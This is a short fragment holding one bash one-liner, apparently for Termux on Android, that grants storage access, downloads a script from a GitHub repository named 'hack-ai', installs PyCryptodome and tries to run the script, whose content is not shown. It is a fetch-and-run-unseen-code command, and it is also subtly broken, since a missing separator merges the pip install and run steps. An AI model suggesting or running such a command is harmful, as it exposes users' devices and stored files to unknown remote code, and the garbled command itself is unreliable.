...
```bash
{ [ -d ~/storage ] || termux-setup-storage; } && curl -o script.py https://raw.githubusercontent.com/Mamadara/hack-ai/refs/heads/main/script.py && pip install PyCryptodome python script.py
```
